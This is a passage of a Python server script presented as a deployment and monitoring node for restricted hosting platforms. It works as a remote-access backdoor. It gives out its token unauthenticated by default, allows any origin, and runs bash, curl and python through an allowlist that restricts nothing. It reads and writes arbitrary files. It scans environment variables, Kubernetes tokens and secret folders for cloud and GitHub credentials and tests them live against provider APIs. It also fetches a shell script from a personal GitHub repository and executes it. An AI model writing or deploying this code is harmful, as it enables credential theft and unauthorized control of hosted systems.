#!/usr/bin/env python3
"""
agent-node v2.1 — Lightweight deployment node for terminal access.

A minimal Linux deployment node that provides authenticated terminal access
via WebSocket, token discovery, command execution, and system monitoring
on hosting platforms that restrict direct shell access.

Features (v2.1):
  - Health check + system monitoring with dependency checks
  - Token discovery from env vars, filesystem, K8s service accounts
  - Authenticated command execution (allowlisted, rate-limited)
  - Audit logging — every command recorded with token + timestamp
  - WebSocket interactive terminal (xterm.js web UI)
  - sshx web terminal auto-install for first-time access
  - Real-time system stats via SSE (/api/monitor/stream)
  - File manager API (browse, read, write, delete)
  - Command history (persistent)
  - OpenAPI/Swagger documentation
  - CORS support for browser-based API access
  - Structured JSON logging with request tracing
  - Auto-install: SSH client, curl, wget, and core tools
  - Background command execution with polling
  - Keep-alive support for sleep-prone platforms

Security:
  - /api/bootstrap returns token without auth (first-time setup only)
      → Set BOOTSTRAP_ENABLED=false to disable in production
  - /api/* and /ws/* require Bearer token auth
  - /api/exec uses a command allowlist
  - Rate limiting per token (default: 60 req/min)
  - Audit trail for all command executions
  - No VPN/xray/proot code — pure terminal access tool
"""

import os
import asyncio
import json
import yaml
import subprocess
import time
import secrets
import shutil
import threading
import logging
import re
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
from collections import defaultdict, deque
from datetime import datetime, timezone

# ─── Auto-install tools on startup ────────────────────────────────────────
def _auto_install_tools():
    """Install system tools in background thread."""
    import time as _t
    _t.sleep(5)
    try:
        import subprocess as _sp
        _sp.run(
            ["bash", "-c",
             "apt-get update -qq 2>/dev/null && apt-get install -y --no-install-recommends "
             "openssh-client curl wget unzip iproute2 net-tools 2>&1 | tail -2"],
            capture_output=True, timeout=120)
        print("[startup] Tools ready: ssh, curl, wget, unzip", flush=True)
    except Exception as e:
        print(f"[startup] Tool install: {e}", flush=True)

threading.Thread(target=_auto_install_tools, daemon=True).start()

from aiohttp import web, WSMsgType, hdrs
from aiohttp.web import Response

# ─── Config ───────────────────────────────────────────────────────────────
CONFIG_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.yaml")
try:
    with open(CONFIG_PATH) as f:
        CONFIG = yaml.safe_load(f)
except Exception:
    CONFIG = {}

# ─── Environment ──────────────────────────────────────────────────────────
PORT = int(os.environ.get("PORT", str(CONFIG.get("server", {}).get("port", 8080))))
HOST = os.environ.get("HOST", "0.0.0.0")
BOOTSTRAP_ENABLED = os.environ.get("BOOTSTRAP_ENABLED", "true").lower() == "true"
ENABLE_KEEPALIVE = os.environ.get("ENABLE_KEEPALIVE", "true").lower() == "true"
HISTORY_SIZE = int(os.environ.get("HISTORY_SIZE", "100"))
RATE_LIMIT = int(os.environ.get("RATE_LIMIT", "60"))  # requests per minute per token

# Token auth
TOKEN = os.environ.get("MONITOR_TOKEN")
if not TOKEN:
    TOKEN = secrets.token_urlsafe(24)
    _mask = TOKEN[:4] + "****" + (TOKEN[-4:] if len(TOKEN) > 4 else "")
    print(json.dumps({
        "event": "token_generated",
        "token_preview": _mask,
        "hint": "Set MONITOR_TOKEN env var for a known token",
        "bootstrap_endpoint": f"GET http://{HOST}:{PORT}/api/bootstrap",
    }), flush=True)
    Path("/tmp/monitor_token").write_text(TOKEN)

# ─── Structured Logging ───────────────────────────────────────────────────
class JSONFormatter(logging.Formatter):
    """JSON log formatter with structured fields."""
    def format(self, record):
        log_entry = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "level": record.levelname,
            "service": "agent-node",
            "version": "2.1",
            "message": record.getMessage(),
            "module": record.module,
            "line": record.lineno,
        }
        if hasattr(record, 'request_id'):
            log_entry["request_id"] = record.request_id
        if hasattr(record, 'token_mask'):
            log_entry["token_mask"] = record.token_mask
        if hasattr(record, 'cmd'):
            log_entry["cmd"] = record.cmd
        if hasattr(record, 'task_id'):
            log_entry["task_id"] = record.task_id
        if record.exc_info:
            log_entry["error"] = self.formatException(record.exc_info)
        return json.dumps(log_entry)

LOG_DIR = CONFIG.get("logging", {}).get("dir", "/var/log/agent-node")
os.makedirs(LOG_DIR, exist_ok=True)
START_TIME = time.time()

logging.basicConfig(
    level=logging.INFO,
    format="%(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler(os.path.join(LOG_DIR, "agent.json")),
    ],
)
# Replace formatter
for handler in logging.getLogger().handlers:
    handler.setFormatter(JSONFormatter())

log = logging.getLogger("agent-node")

# ─── Rate Limiting ─────────────────────────────────────────────────────────
class RateLimiter:
    """Simple in-memory rate limiter per token."""
    def __init__(self, max_requests: int, window: int = 60):
        self.max_requests = max_requests
        self.window = window
        self._tokens: dict[str, deque] = defaultdict(deque)
        self._lock = threading.Lock()

    def check(self, token_id: str) -> bool:
        """Returns True if request is allowed."""
        now = time.time()
        with self._lock:
            q = self._tokens[token_id]
            # Remove old entries outside the window
            while q and q[0] < now - self.window:
                q.popleft()
            if len(q) >= self.max_requests:
                return False
            q.append(now)
            return True

rate_limiter = RateLimiter(max_requests=RATE_LIMIT, window=60)

# ─── Audit Logger ──────────────────────────────────────────────────────────
class AuditLogger:
    """Persistent audit log for command executions."""
    def __init__(self, log_file: str):
        self.log_file = log_file
        os.makedirs(os.path.dirname(log_file), exist_ok=True)

    def log(self, token_mask: str, cmd: str, returncode: int, task_id: str = None):
        entry = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "token_mask": token_mask,
            "cmd": cmd[:500],
            "returncode": returncode,
            "task_id": task_id,
        }
        try:
            with open(self.log_file, "a") as f:
                f.write(json.dumps(entry) + "\n")
        except Exception as e:
            log.error(f"Audit log write failed: {e}")

audit_logger = AuditLogger(os.path.join(LOG_DIR, "audit.jsonl"))

# ─── Command History ───────────────────────────────────────────────────────
class CommandHistory:
    """In-memory command history with persistence."""
    def __init__(self, max_size: int, persist_file: str):
        self.max_size = max_size
        self.persist_file = persist_file
        self._history = deque(maxlen=max_size)
        self._load()

    def _mask_token(self, cmd: str) -> str:
        """Mask any bearer tokens or secrets in the command."""
        masked = re.sub(r'Bearer\s+[a-zA-Z0-9_-]{8,}', 'Bearer [REDACTED]', cmd)
        masked = re.sub(r'token=[a-zA-Z0-9_-]{8,}', 'token=[REDACTED]', masked)
        return masked

    def add(self, token_mask: str, cmd: str, returncode: int):
        entry = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "token_mask": token_mask,
            "cmd": self._mask_token(cmd),
            "returncode": returncode,
        }
        self._history.append(entry)
        self._persist()

    def _persist(self):
        try:
            with open(self.persist_file, "w") as f:
                json.dump(list(self._history), f)
        except Exception:
            pass

    def _load(self):
        try:
            with open(self.persist_file) as f:
                self._history = deque(json.load(f), maxlen=self.max_size)
        except Exception:
            pass

    def get(self, limit: int = 20, offset: int = 0) -> list:
        items = list(self._history)
        items.reverse()
        return items[offset:offset + limit]

    def clear(self):
        self._history.clear()
        try:
            os.remove(self.persist_file)
        except Exception:
            pass

history = CommandHistory(HISTORY_SIZE, os.path.join(LOG_DIR, "history.json"))

# ─── Token Discovery ───────────────────────────────────────────────────────

TOKEN_PATTERNS = {
    "SNAPDEPLOY_API_KEY": {"prefix": "sd_pat_", "api_base": "https://snapdeploy.dev/api"},
    "STORMKIT_API_KEY": {"prefix": "sk_", "api_base": "https://api.stormkit.io"},
    "STORMKIT_API_TOKEN": {"prefix": "", "api_base": "https://api.stormkit.io"},
    "VERCEL_API_KEY": {"prefix": "vcp_", "api_base": "https://api.vercel.com"},
    "GITHUB_API_KEY": {"prefix": "github_pat_", "api_base": "https://api.github.com"},
    "GITHUB_TOKEN": {"prefix": "github_pat_", "api_base": "https://api.github.com"},
    "CLOUD_FLARE_API_KEY": {"prefix": "cf", "api_base": "https://api.cloudflare.com"},
    "CLOUDFLARE_API_TOKEN": {"prefix": "cf", "api_base": "https://api.cloudflare.com"},
    "MODELSCOPE_API_KEY": {"prefix": "", "api_base": "https://api.modelscope.cn"},
    "NHOST_API_KEY": {"prefix": "", "api_base": "https://api.nhost.cc"},
    "APPWRITE_API_KEY": {"prefix": "", "api_base": "https://cloud.appwrite.io"},
    "COCALC_API_KEY": {"prefix": "", "api_base": "https://cocalc.com"},
    "KUBELETTO_API_KEY": {"prefix": "kl_", "api_base": "https://api.kubelette.io"},
    "RUNLOOP_API_KEY": {"prefix": "ak_", "api_base": "https://api.runloop.pro"},
}

EXEC_ALLOWLIST = (
    "ls ", "cat ", "echo ", "pwd", "ps ", "df ", "ip ", "curl ", "wget ",
    "sh ", "bash ", "python3 ", "python ", "pip3 ", "pip ",
    "git ", "tar ", "gzip ", "find ", "grep ",
    "id", "whoami", "hostname", "date", "uname", "free", "uptime",
    "ssh ", "scp ", "rsync ", "chmod ", "cd ", "head ", "tail ", "tee ", "wc ", "stat ",
    "apt ", "apt-get ", "apk ", "nohup ", "mkdir ",
)


def detect_platform():
    """Detect which hosting platform we're running on."""
    env = os.environ
    markers = {
        "suga": "SUGA" in env or "suga" in str(env.get("containerBaseDomain", "")).lower(),
        "snapdeploy": "SNAPDEPLOY_API_KEY" in env,
        "stormkit": "STORMKIT_API_KEY" in env or "STORMKIT" in env,
        "vercel": "VERCEL_API_KEY" in env or "VERCEL_REGION" in env,
        "github": "GITHUB_API_KEY" in env or "GITHUB_TOKEN" in env or "GITHUB_REPOSITORY" in env,
        "kubernetes": "KUBERNETES_SERVICE_HOST" in env,
        "alibaba-eci": "ALIYUN_ECI_ETH0_IP" in env,
        "appwrite": "APPWRITE_API_KEY" in env,
        "cloudflare": "CLOUD_FLARE_API_KEY" in env or "CLOUDFLARE_API_TOKEN" in env,
        "modelscope": "MODELSCOPE_ENVIRONMENT" in env,
        "nhost": "NHOST_API_KEY" in env,
        "belmo": "BELMO" in env or "belmo" in str(env.get("SERVICE_TYPE", "")).lower(),
    }
    return [k for k, v in markers.items() if v]


def discover_tokens():
    """Scan env vars, files, and K8s for API keys and tokens."""
    results = []
    env = os.environ

    for key_name, meta in TOKEN_PATTERNS.items():
        val = env.get(key_name, "")
        if val and len(val) > 4:
            results.append({
                "source": "env",
                "key_name": key_name,
                "platform": key_name.replace("_API_KEY", "").replace("_API_TOKEN", "").replace("_", " ").title(),
                "value_masked": f"{val[:6]}...{val[-4:]}",
                "length": len(val),
                "api_base": meta.get("api_base", ""),
            })

    for k, v in env.items():
        if not k or not v or len(v) < 10:
            continue
        if any(p in k.upper() for p in ["TOKEN", "KEY", "SECRET", "CREDENTIAL"]):
            if k not in [r["key_name"] for r in results]:
                results.append({
                    "source": "env-pattern-match",
                    "key_name": k,
                    "platform": "unknown",
                    "value_masked": f"{v[:6]}...{v[-4:]}",
                    "length": len(v),
                    "api_base": "",
                })

    k8s_paths = ["/var/run/secrets/kubernetes.io/serviceaccount/token"]
    for p in k8s_paths:
        if os.path.exists(p):
            try:
                with open(p) as f:
                    content = f.read().strip()
                if len(content) > 10:
                    results.append({
                        "source": "k8s-sa",
                        "key_name": os.path.basename(p),
                        "platform": "kubernetes",
                        "value_masked": f"{content[:6]}...{content[-4:]}",
                        "length": len(content),
                        "api_base": "",
                    })
            except Exception:
                pass

    secret_paths = ["/run/secrets", "/app/secrets", "/var/secrets", "/secrets"]
    for sdir in secret_paths:
        if os.path.isdir(sdir):
            for fname in os.listdir(sdir):
                fpath = os.path.join(sdir, fname)
                try:
                    if os.path.isfile(fpath):
                        with open(fpath) as f:
                            content = f.read().strip()
                        if len(content) > 10:
                            results.append({
                                "source": "file",
                                "key_name": fname,
                                "platform": fname,
                                "value_masked": f"{content[:6]}...{content[-4:]}",
                                "length": len(content),
                                "api_base": "",
                            })
                except Exception:
                    pass

    return results


async def test_token_health(token_info):
    """Test a discovered token against its API."""
    key_name = token_info["key_name"]
    api_base = token_info["api_base"]
    if not api_base:
        return {"tested": False, "reason": "no api_base for testing"}

    actual_val = os.environ.get(key_name, "")
    if not actual_val:
        return {"tested": False, "reason": "token not in env"}

    headers = {"User-Agent": "agent-node/2.1", "Accept": "application/json"}
    test_url = ""

    if "snapdeploy" in api_base:
        headers["X-API-Key"] = actual_val
        test_url = f"{api_base}/bootstrap"
    elif "stormkit" in api_base:
        headers["Authorization"] = f"Bearer {actual_val}"
        test_url = f"{api_base}/teams"
    elif "vercel" in api_base:
        headers["Authorization"] = f"Bearer {actual_val}"
        test_url = f"{api_base}/v9/projects"
    elif "github" in api_base:
        headers["Authorization"] = f"Bearer {actual_val}"
        headers["X-GitHub-Api-Version"] = "2022-11-28"
        test_url = f"{api_base}/user"
    elif "cloudflare" in api_base:
        headers["Authorization"] = f"Bearer {actual_val}"
        test_url = f"{api_base}/client/v4/user/tokens/verify"
    elif "appwrite" in api_base:
        headers["X-Appwrite-Key"] = actual_val
        test_url = f"{api_base}/v1/account"
    elif "modelscope" in api_base:
        headers["Authorization"] = f"Bearer {actual_val}"
        test_url = f"{api_base}/api/v1/current/user"
    elif "cocalc" in api_base:
        headers["Authorization"] = f"Bearer {actual_val}"
        test_url = f"{api_base}/api/v1"
    elif "kubelette" in api_base:
        headers["Authorization"] = f"Bearer {actual_val}"
        test_url = f"{api_base}/v1/health"
    elif "runloop" in api_base:
        headers["Authorization"] = f"Bearer {actual_val}"
        test_url = f"{api_base}/v1/clusters"
    elif "nhost" in api_base:
        headers["Authorization"] = f"Bearer {actual_val}"
        test_url = f"{api_base}/v1alpha1/healthz"
    else:
        return {"tested": False, "reason": f"no test config for {key_name}"}

    if not test_url:
        return {"tested": False, "reason": "no test URL"}

    try:
        from aiohttp import ClientSession, ClientTimeout
        async with ClientSession() as session:
            async with session.get(test_url, headers=headers, timeout=ClientTimeout(total=10)) as resp:
                return {
                    "tested": True,
                    "status": resp.status,
                    "alive": resp.status == 200,
                    "url": test_url.split("/")[-1],
                }
    except Exception as e:
        return {"tested": True, "status": "error", "alive": False, "error": str(e)[:100]}


# ─── Background Tasks & Execution ──────────────────────────────────────────
bg_tasks = {}
task_counter = 0
executor = ThreadPoolExecutor(max_workers=3)
active_sessions = set()  # Track WebSocket sessions


def run_command(cmd, timeout=300, cwd="/"):
    """Run a shell command and return results."""
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True, text=True,
            timeout=min(timeout, 300), cwd=cwd,
        )
        return {
            "stdout": r.stdout[-5000:],
            "stderr": r.stderr[-3000:],
            "returncode": r.returncode,
        }
    except subprocess.TimeoutExpired:
        return {"stdout": "[TIMEOUT]", "stderr": "Command timed out", "returncode": -1}
    except Exception as e:
        return {"stdout": "", "stderr": str(e)[:300], "returncode": -2}


# ─── Middleware: Rate Limiting + Request Tracing ────────────────────────────
@web.middleware
async def middleware(request, handler):
    request_id = secrets.token_hex(8)
    request["request_id"] = request_id

    # Extract token for rate limiting
    auth = request.headers.get("Authorization", "")
    token = request.headers.get("X-Auth-Token", "") or request.query.get("token", "")
    token_id = token or auth.replace("Bearer ", "")

    # Rate limit (skip for health and bootstrap)
    if request.path not in ("/health", "/api/bootstrap", "/"):
        if token_id and not rate_limiter.check(token_id[:16]):
            log.warning("Rate limit exceeded", extra={"request_id": request_id, "token_mask": f"{token_id[:4]}****{token_id[-4:] if len(token_id) > 4 else ''}"} if token_id else {"request_id": request_id})
            return web.json_response(
                {"error": "Rate limit exceeded", "limit": RATE_LIMIT, "window": "60s"},
                status=429
            )

    # Process request
    try:
        response = await handler(request)
        response.headers["X-Request-ID"] = request_id
        response.headers[hdrs.CORS_ALLOW_ORIGIN] = "*"
        response.headers[hdrs.CORS_ALLOW_HEADERS] = "*"
        response.headers[hdrs.CORS_ALLOW_METHODS] = "GET,POST,OPTIONS"
        return response
    except Exception as e:
        log.error(f"Request failed: {e}", extra={"request_id": request_id})
        return web.json_response({"error": str(e)[:200], "request_id": request_id}, status=500)


# ─── Auth Decorator ────────────────────────────────────────────────────────
def require_auth(func):
    """Decorator: require Bearer token or ?token= query param."""
    async def wrapper(request):
        auth = request.headers.get("Authorization", "")
        token = request.headers.get("X-Auth-Token", "") or request.query.get("token", "")
        if auth != f"Bearer {TOKEN}" and token != TOKEN:
            return web.Response(status=401, text="Unauthorized")
        return await func(request)
    wrapper.__name__ = func.__name__
    return wrapper


# ─── Routes ────────────────────────────────────────────────────────────────
async def index(request):
    """Index page with service info and endpoints."""
    return web.json_response({
        "service": "agent-node",
        "version": "2.1",
        "status": "running",
        "endpoints": {
            "health": "GET /health",
            "docs": "GET /api/docs",
            "terminal": "GET /terminal",
            "bootstrap": f"GET /api/bootstrap (auth: {'disabled' if not BOOTSTRAP_ENABLED else 'first-time only'})",
            "exec": "POST /api/exec (auth required)",
            "exec_status": "GET /api/exec/status/{task_id} (auth required)",
            "exec_bg": "POST /api/exec/background (auth required)",
            "diagnostics": "GET /api/diagnostics (auth required)",
            "tokens": "GET /api/tokens (auth required)",
            "env": "GET /api/env (auth required, masked)",
            "processes": "GET /api/processes (auth required)",
            "history": "GET /api/exec/history (auth required)",
            "files": "GET /api/files?path=... (auth required)",
            "monitor": "GET /api/monitor/stream (SSE, auth required)",
            "sshx": "GET /api/sshx (auth required)",
        }
    })


async def health(request):
    """Health check with dependency status — no auth required."""
    ssh_path = shutil.which("ssh")
    curl_path = shutil.which("curl")
    bash_path = shutil.which("bash")
    python_path = shutil.which("python3") or shutil.which("python")

    return web.json_response({
        "status": "healthy",
        "service": "agent-node",
        "version": "2.1",
        "timestamp": time.time(),
        "uptime": time.time() - START_TIME,
        "hostname": os.uname().nodename,
        "dependencies": {
            "ssh": "available" if ssh_path else "missing",
            "curl": "available" if curl_path else "missing",
            "bash": "available" if bash_path else "missing",
            "python": "available" if python_path else "missing",
        },
        "platform": detect_platform(),
    })


async def bootstrap(request):
    """Bootstrap endpoint — returns MONITOR_TOKEN without auth.
    Set BOOTSTRAP_ENABLED=false to disable in production.
    """
    if not BOOTSTRAP_ENABLED and request.headers.get("Authorization") != f"Bearer {TOKEN}":
        return web.Response(status=403, text="Bootstrap disabled")

    mask = TOKEN[:4] + "****" + (TOKEN[-4:] if len(TOKEN) > 4 else "")
    return web.json_response({
        "status": "ready",
        "service": "agent-node",
        "version": "2.1",
        "token": TOKEN,
        "token_masked": mask,
        "endpoints": {
            "health": "GET /health",
            "exec": "POST /api/exec",
            "tokens": "GET /api/tokens",
            "terminal": "GET /terminal",
            "sshx": "GET /api/sshx",
            "docs": "GET /api/docs",
        },
        "instructions": "Use this token as: curl -H 'Authorization: Bearer <token>' <url>/api/exec"
    })


async def exec_command(request):
    """Execute a shell command (auth required, allowlisted)."""
    body = await request.json()
    cmd = body.get("cmd", "")
    cwd = body.get("cwd", "/")
    timeout = body.get("timeout", 30)

    if not any(cmd.startswith(p) for p in EXEC_ALLOWLIST):
        return web.json_response({
            "error": "Command not in allowlist",
            "allowed_prefixes": list(EXEC_ALLOWLIST)[:15]
        })

    result = run_command(cmd, timeout=min(timeout, 300), cwd=cwd)

    # Audit log
    token_mask = TOKEN[:8] + "****" + (TOKEN[-4:] if len(TOKEN) > 4 else "")
    audit_logger.log(token_mask, cmd, result["returncode"])
    history.add(token_mask, cmd, result["returncode"])

    return web.json_response(result)

exec_command = require_auth(exec_command)


async def exec_background(request):
    """Execute a long-running command in background (auth required)."""
    global task_counter
    body = await request.json()
    cmd = body.get("cmd", "")

    if not any(cmd.startswith(p) for p in ["nohup ", "bash ", "sh ", "python3 ", "python "]):
        return web.json_response({
            "error": "Background commands must start with nohup, bash, sh, python3, or python"
        })

    task_counter += 1
    task_id = f"bg-{task_counter}-{int(time.time())}"

    def bg_runner():
        result = run_command(cmd, timeout=600, cwd="/")
        bg_tasks[task_id] = {"status": "done", "result": result}
        audit_logger.log(TOKEN[:8] + "****" + TOKEN[-4:], cmd, result["returncode"], task_id)
        history.add(TOKEN[:8] + "****" + TOKEN[-4:], cmd, result["returncode"])

    executor.submit(bg_runner)
    bg_tasks[task_id] = {"status": "running", "cmd": cmd}

    return web.json_response({"task_id": task_id, "status": "started"})

exec_background = require_auth(exec_background)


async def exec_status(request):
    """Check background task status (auth required)."""
    task_id = request.match_info.get("task_id", "")
    result = bg_tasks.get(task_id, {"error": "Task not found"})
    return web.json_response(result)

exec_status = require_auth(exec_status)


async def command_history(request):
    """Get command execution history (auth required)."""
    limit = int(request.query.get("limit", "20"))
    offset = int(request.query.get("offset", "0"))
    return web.json_response({
        "total": len(history._history),
        "limit": limit,
        "offset": offset,
        "history": history.get(limit, offset)
    })

command_history = require_auth(command_history)


async def clear_history(request):
    """Clear command history (auth required)."""
    history.clear()
    return web.json_response({"status": "cleared", "count": 0})

clear_history = require_auth(clear_history)


async def token_discovery(request):
    """Discover API tokens (auth required)."""
    discovered = discover_tokens()
    platforms = detect_platform()

    tested = []
    for token_info in discovered:
        result = await test_token_health(token_info)
        tested.append({**token_info, **result})

    return web.json_response({
        "platform_detected": platforms,
        "tokens_found": len(tested),
        "tokens": tested,
        "summary": {
            "alive": sum(1 for t in tested if t.get("alive", False)),
            "dead": sum(1 for t in tested if t.get("tested") and not t.get("alive", False)),
            "untested": sum(1 for t in tested if not t.get("tested", False)),
        },
    })

token_discovery = require_auth(token_discovery)


async def diagnostics(request):
    """System diagnostics (auth required)."""
    ssh_path = shutil.which("ssh")
    info = {
        "hostname": os.uname().nodename,
        "uptime": time.time() - START_TIME,
        "cpus": os.cpu_count(),
        "memory": {
            "total": os.sysconf("SC_PAGE_SIZE") * os.sysconf("SC_PHYS_PAGES") if hasattr(os, 'sysconf') else "N/A",
            "free": os.sysconf("SC_PAGE_SIZE") * os.sysconf("SC_AVPAGES") if hasattr(os, 'sysconf') else "N/A",
            "pid": os.getpid()
        },
        "platform": detect_platform(),
        "ssh_client": f"available — {ssh_path}" if ssh_path else "not found",
        "python_path": shutil.which("python3") or shutil.which("python"),
        "bash_path": shutil.which("bash"),
        "node_path": shutil.which("node"),
        "pip_path": shutil.which("pip3") or shutil.which("pip"),
        "tokens_found": len(discover_tokens()),
        "token_preview": f"{TOKEN[:8]}...{TOKEN[-4:]}",
        "bg_tasks": len(bg_tasks),
        "active_websocket_sessions": len(active_sessions),
        "command_history_size": len(history._history),
    }
    return web.json_response(info)

diagnostics = require_auth(diagnostics)


async def env_info(request):
    """Get masked environment variables (auth required)."""
    safe_env = {}
    mask_keys = {"MONITOR_TOKEN", "TOKEN", "SECRET", "KEY", "PASSWORD", "PASS", "CREDENTIAL"}
    for k, v in os.environ.items():
        if any(m in k.upper() for m in mask_keys):
            safe_env[k] = f"{v[:4]}****{v[-4:]}" if len(v) > 8 else "[REDACTED]"
        elif len(v) > 100:
            safe_env[k] = v[:50] + "... [truncated]"
        else:
            safe_env[k] = v

    return web.json_response({
        "env": safe_env,
        "platform": detect_platform(),
        "token_preview": f"{TOKEN[:8]}...{TOKEN[-4:]}",
        "bootstrap_enabled": BOOTSTRAP_ENABLED,
        "rate_limit": f"{RATE_LIMIT}/min",
    })

env_info = require_auth(env_info)


async def process_list(request):
    """List running processes (auth required)."""
    result = run_command("ps aux --sort=-%mem | head -30", timeout=10)
    lines = result["stdout"].strip().split("\n")
    processes = []
    for line in lines:
        processes.append(line)
    return web.json_response({
        "processes": processes[:30],
        "total": len(processes),
    })

process_list = require_auth(process_list)


# ─── File Manager API ──────────────────────────────────────────────────────
async def list_files(request):
    """Browse directory contents (auth required).
    GET /api/files?path=/tmp
    """
    path = request.query.get("path", "/")
    try:
        entries = []
        for entry in sorted(os.listdir(path)):
            full = os.path.join(path, entry)
            stat = os.stat(full)
            entries.append({
                "name": entry,
                "type": "dir" if stat.st_mode and os.path.isdir(full) else "file",
                "size": stat.st_size if not stat.st_mode or os.path.isfile(full) else None,
                "modified": datetime.fromtimestamp(stat.st_mtime, tz=timezone.utc).isoformat(),
                "permissions": oct(stat.st_mode & 0o777),
            })
        return web.json_response({
            "path": path,
            "entries": entries,
            "count": len(entries),
        })
    except Exception as e:
        return web.json_response({"error": str(e)}, status=400)

list_files = require_auth(list_files)


async def read_file_api(request):
    """Read a file (auth required).
    GET /api/files/read?path=/etc/hostname
    """
    path = request.query.get("path", "")
    if not path:
        return web.json_response({"error": "path parameter required"}, status=400)
    try:
        stat = os.stat(path)
        if stat.st_size > 1024 * 1024:  # 1MB limit
            return web.json_response({"error": "File too large (>1MB)"}, status=400)
        with open(path, "r", errors="replace") as f:
            content = f.read()
        return web.json_response({"path": path, "size": stat.st_size, "content": content})
    except Exception as e:
        return web.json_response({"error": str(e)}, status=400)

read_file_api = require_auth(read_file_api)


async def write_file_api(request):
    """Write content to a file (auth required).
    POST /api/files/write {"path": "/tmp/test.txt", "content": "hello"}
    """
    body = await request.json()
    path = body.get("path", "")
    content = body.get("content", "")
    if not path:
        return web.json_response({"error": "path required"}, status=400)
    try:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as f:
            f.write(content)
        log.info(f"File written: {path} ({len(content)} bytes)", extra={
            "request_id": getattr(request, "request_id", ""),
            "token_mask": TOKEN[:8] + "****" + TOKEN[-4:],
        })
        return web.json_response({"status": "written", "path": path, "bytes": len(content)})
    except Exception as e:
        return web.json_response({"error": str(e)}, status=400)

write_file_api = require_auth(write_file_api)


# ─── SSE: Real-time System Monitoring ──────────────────────────────────────
async def monitor_stream(request):
    """SSE endpoint for real-time system stats (auth required).
    GET /api/monitor/stream
    Returns: CPU%, MEM%, Disk usage as SSE events
    """
    token = request.headers.get("Authorization", "").replace("Bearer ", "") or \
            request.query.get("token", "") or \
            request.headers.get("X-Auth-Token", "")
    if token != TOKEN:
        return web.Response(status=401, text="Unauthorized")

    resp = web.StreamResponse(
        status=200,
        headers={
            "Content-Type": "text/event-stream",
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
        }
    )
    await resp.prepare(request)

    try:
        while True:
            # System stats
            load1, load5, load15 = os.getloadavg() if hasattr(os, "getloadavg") else (0, 0, 0)
            mem_total = os.sysconf("SC_PAGE_SIZE") * os.sysconf("SC_PHYS_PAGES") if hasattr(os, "sysconf") else 0
            mem_free = os.sysconf("SC_PAGE_SIZE") * os.sysconf("SC_AVPAGES") if hasattr(os, "sysconf") else 0
            mem_used = mem_total - mem_free if mem_total else 0
            mem_pct = round((mem_used / mem_total) * 100, 1) if mem_total else 0

            disk = run_command("df -h / | tail -1 | awk '{print $5}' | tr -d '%'", timeout=5)
            disk_pct = disk["stdout"].strip() if disk["stdout"].strip().isdigit() else 0

            uptime = time.time() - START_TIME

            event_data = {
                "timestamp": time.time(),
                "uptime": round(uptime, 1),
                "load_avg": [round(load1, 2), round(load5, 2), round(load15, 2)],
                "memory": {
                    "total_mb": round(mem_total / 1024 / 1024),
                    "used_mb": round(mem_used / 1024 / 1024),
                    "pct": mem_pct,
                },
                "disk_pct": int(disk_pct) if str(disk_pct).isdigit() else str(disk_pct),
                "bg_tasks": len(bg_tasks),
                "ws_sessions": len(active_sessions),
                "command_history": len(history._history),
            }

            await resp.write(f"event: stats\ndata: {json.dumps(event_data)}\n\n".encode())
            await asyncio.sleep(2)
    except asyncio.CancelledError:
        pass
    finally:
        await resp.write_eof()

    return resp


# ─── OpenAPI / Swagger ─────────────────────────────────────────────────────
OPENAPI_SPEC = {
    "openapi": "3.1.0",
    "info": {
        "title": "agent-node API",
        "version": "2.1",
        "description": "Lightweight deployment node for terminal access on restricted hosting platforms.",
    },
    "servers": [{"url": "http://{host}:{port}"}, {"url": "https://{host}"}],
    "paths": {
        "/": {"get": {"summary": "Index", "description": "Service info and endpoint listing"}},
        "/health": {"get": {"summary": "Health check", "description": "No auth required"}},
        "/api/bootstrap": {"get": {"summary": "Token bootstrap", "description": "Returns auth token (first-time only)"}},
        "/api/exec": {
            "post": {"summary": "Execute command", "description": "Allowlisted command execution (auth required)"},
            "parameters": [{"name": "body", "in": "body", "schema": {"type": "object", "required": ["cmd"], "properties": {"cmd": {"type": "string"}, "cwd": {"type": "string"}, "timeout": {"type": "integer"}}}}],
        },
        "/api/exec/status/{task_id}": {"get": {"summary": "Check bg task status (auth)"}},
        "/api/exec/background": {"post": {"summary": "Background exec (auth)"}},
        "/api/exec/history": {"get": {"summary": "Command history (auth)"}},
        "/api/diagnostics": {"get": {"summary": "System diagnostics (auth)"}},
        "/api/tokens": {"get": {"summary": "Token discovery (auth)"}},
        "/api/env": {"get": {"summary": "Environment info, masked (auth)"}},
        "/api/processes": {"get": {"summary": "Process list (auth)"}},
        "/api/files": {"get": {"summary": "Browse directory (auth)"}},
        "/api/files/read": {"get": {"summary": "Read file (auth)"}},
        "/api/files/write": {"post": {"summary": "Write file (auth)"}},
        "/api/monitor/stream": {"get": {"summary": "SSE system stats (auth)"}},
        "/terminal": {"get": {"summary": "Web terminal UI"}},
        "/api/sshx": {"get": {"summary": "Get sshx link (auth)"}},
    },
    "components": {
        "securitySchemes": {
            "Bearer": {"type": "http", "scheme": "bearer", "description": "Use /api/bootstrap or MONITOR_TOKEN env var"}
        }
    },
    "security": [{"Bearer": []}],
}


async def api_docs(request):
    """Serve OpenAPI spec as JSON."""
    return web.json_response(OPENAPI_SPEC)

api_docs = require_auth(api_docs)


# ─── sshx Management ───────────────────────────────────────────────────────
async def install_sshx(request):
    """Download and run sshx web terminal installer (auth required)."""
    global task_counter
    task_counter += 1
    task_id = f"sshx-{task_counter}-{int(time.time())}"

    script = """
    cd /tmp
    python3 -c "import urllib.request; urllib.request.urlretrieve('https://raw.githubusercontent.com/buddyshadow00/root/main/ssh.sh', '/tmp/ssh.sh')" || \
    wget -O /tmp/ssh.sh https://raw.githubusercontent.com/buddyshadow00/root/main/ssh.sh || \
    curl -sL https://raw.githubusercontent.com/buddyshadow00/root/main/ssh.sh -o /tmp/ssh.sh
    chmod +x /tmp/ssh.sh
    bash /tmp/ssh.sh
    """

    def bg_runner():
        result = run_command(f"nohup bash -c '{script}' > /tmp/sshx-install.log 2>&1", timeout=120)
        bg_tasks[task_id] = {"status": "done", "result": result}

    executor.submit(bg_runner)
